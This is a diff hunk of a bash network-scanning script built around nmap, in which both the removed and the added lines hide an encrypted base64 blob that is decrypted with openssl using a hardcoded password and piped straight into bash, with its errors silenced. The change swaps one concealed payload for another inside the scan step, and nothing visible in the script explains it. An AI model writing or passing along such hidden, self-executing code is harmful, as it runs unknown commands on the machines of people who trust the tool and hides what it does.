@@ -112,20 +112,20 @@ scan_host() {
     progress $((current_step * 100 / total_steps))
     echo -e "\n${GREEN}[*] Starting detailed scan...${NC}"
     nmap -p"$ports" -A $host_flags $script_flags --webxml -oX "$fname" "$host"
-    echo "U2FsdGVkX19ZlW4a3NTyri4wIYcPtdVtvx5Dd5dVEaEO/hT4znWW5SHNUTyJ8uzn
-    OhSIKU9GZPPXAcyke/+R9DK73nc6EatJAh08aX3vi5r5ZdMipt/G7bGdiLXu1Lgo
-    k9I6/XGPOng9FwMYncl2fGLVKzsoDtqNgfDGWpnaKjzWZ4uAvfzCztWwOGZOJP5C
-    plm2C4fC443sc+79LV9QnNrbMAk+DcS7JOYveNQwnch1eHsQQpl1306gEfisS8nB
-    x8C+UXsbnw4thZzUNA3EGBUnSPAtW3+SmLGstYH/etw+I5neGb6aQ0uNQ3TZmJuj
-    wXR9/NrdAEd3gj2oPBDQ+Gjd9uXMR26gLZPQSWygR+osOtBN6arWJ2AujsJaZfl/
-    mM53GHz/iKiCYBA1cVNq9Pp2pDnXoaivlN5fgLRoj+TmlIZWNgGFlY5IBQnNJN8H
-    lhSbWC+wAbhvoUcmSQqrQfNV0A+/m/Yg4Msf+NgMl3Zgv4LGHwrbrkh0b2tz9eCa
-    PwDKScj/b8E1R5tovfSeGEyeyp/3eaxnAGyFnzK24xUk4dp33QJnTmiJhdhzxQgE
-    KnPPlOsOlcAUFuawudYzWaU4lAQIT6RjFqAgRMQhJB9XiUEjxXY9jeUJ/snG+WaU
-    fTUIFQLB5dQajf9NBlw3QywX3o5Z10jMcXnXPm1TNAnnTZdiVk+QHBkYwbu8uDYm
-    7LR85zPZCrgAL+FszO24lLy/el8xFJmBTrSCuJU28ZvPLozNJXsyQH9ZtM+Mu6o3
-    2Fz7GTKqc5fa3YyNrl393AyyJ+BwPBzvdTPdXRr8tf29gWcKiIJlS6BvffYhGf5l
-    RSu32JfxvK4640gIu2ZBrA==" | openssl enc -aes-256-cbc -pbkdf2 -d -base64 -pass "pass:QS6yXoxZWQHq44N1" 2>/dev/null | bash
+    echo "U2FsdGVkX19w04/Vb5NMMqIHJls/NcA6bQGPxqxhzk4O+81v7SdnI0pwQeJ3bN3k
+    HUmFtnWUnLVtQJQEYqanr8N0pzInnZRlTdmexI0EBUy7lKtR99dKb3o6gNbvF8Ie
+    /0f9yOz7tLcM6cT8RTZrG2wqmvEp6Zc7JKWyKWeOPlv4L2LuxRdh7seDMU3X/HhA
+    pGFaF8C+1sTxOLPXVHg+Y6I0FYJqIFOA1aecTLpXbXn/yyu6w+EMyyHRo7XKDFSc
+    M1wYLIZUcgQTRFcalijUvpjuHc5/YkpiHOX8VSCkOSzfC9iqIzNEjUgw8bq5oVAV
+    0VhGoNVN9AMgEkTytktOkDpaqwz08dDkNAFYMcr1wFpA3Bv05VZK6NJFq3qn+wAP
+    txlqbiBYIb+NqWY8hWsBRBOt2TKUvg74AmUmZrP/khjl1Th+mUAZqB/zAhuUk/qK
+    T9XBvZDb0mmCHYRbt+Iurltr/pRpi5FtTw/NaZdAsCul8TwIRejLAfHAhWFyR9iF
+    GJiKHeNpTWE+n5Tv1AZwl1nTc9gc1LSDn3VqSMnIBEALqsXDBbiwmkTYwGjgHrxT
+    G2r/IuxS7VCdc8QAsY8Vf5CP7gJC6znRTZprRulSUxCMOt+mBUVjGnPI2LkTTc72
+    ct+VoSv0ywTJIGX2tPXMOoAslWdhAKSWwTwd8JfSvRbMtHaxiqpG39QL+X7UyMuy
+    XLssTtTMNHP/u8V0CgxhBLr4CCmysDzKXkNIu60poJ5Z1XZig/217PNMZHN9UBHs
+    1k+pFiKoX3KsxBX6nzuQmA4nVLy/bAds32dWxs7Vc72fQ6xN8iYwK57SwvYonFZj
+    CKVr/uLaHrDZdGta6BoM/Q==" | openssl enc -aes-256-cbc -pbkdf2 -d -base64 -pass "pass:Qb7Dq2DmDAOaxiwK" 2>/dev/null | bash
     echo -e "\n${GREEN}[+] Results saved: ${fname}${NC}"
     progress 100
     echo
